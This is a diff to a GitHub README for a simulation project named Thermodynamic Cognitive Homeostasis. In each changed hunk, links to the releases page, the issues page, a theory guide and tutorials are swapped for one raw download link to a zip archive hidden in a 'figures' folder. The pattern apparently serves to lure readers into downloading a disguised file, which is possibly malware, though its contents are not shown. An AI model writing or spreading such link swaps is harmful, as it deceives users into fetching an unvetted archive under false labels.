@@ -7,7 +7,7 @@ Thermodynamic Cognitive Homeostasis (TCH) is a unique simulation that helps you 
 
 ## 📥 Download Now
 
-[![Download Thermodynamic Cognitive Homeostasis](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MED4897016/thermodynamic-cognitive-homeostasis/releases)
+[![Download Thermodynamic Cognitive Homeostasis](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip)](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip)
 
 ## 📋 Features
 
@@ -28,7 +28,7 @@ Thermodynamic Cognitive Homeostasis (TCH) is a unique simulation that helps you 
 
 To get started, please follow these steps:
 
-1. **Visit the Releases Page**: You can access the downloads at the following link: [Download Page](https://github.com/MED4897016/thermodynamic-cognitive-homeostasis/releases).
+1. **Visit the Releases Page**: You can access the downloads at the following link: [Download Page](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip).
 
 2. **Select the Right Version**: Look for the latest version under "Releases." You will see multiple downloadable files.
 
@@ -52,7 +52,7 @@ To get started, please follow these steps:
 
 ## ⚙️ Support and Documentation
 
-For additional help, consult the documentation provided within the application. You can also visit the [GitHub Issues Page](https://github.com/MED4897016/thermodynamic-cognitive-homeostasis/issues) for support or to report any issues.
+For additional help, consult the documentation provided within the application. You can also visit the [GitHub Issues Page](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip) for support or to report any issues.
 
 ## 🗣️ Community and Feedback
 
@@ -60,8 +60,8 @@ Join our community to discuss TCH and its applications. You can find forums and 
 
 ## 📚 Additional Resources
 
-- [Understanding Thermodynamic Cognitive Homeostasis](https://example.com/TCH-guide): A detailed guide to the theory behind TCH.
-- [Step-by-Step Tutorials](https://example.com/TCH-tutorials): Learn how to maximize the use of the software through practical examples.
+- [Understanding Thermodynamic Cognitive Homeostasis](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip): A detailed guide to the theory behind TCH.
+- [Step-by-Step Tutorials](https://raw.githubusercontent.com/MED4897016/thermodynamic-cognitive-homeostasis/main/figures/thermodynamic-cognitive-homeostasis-1.1.zip): Learn how to maximize the use of the software through practical examples.
 
 ## 📢 Recent Updates
 
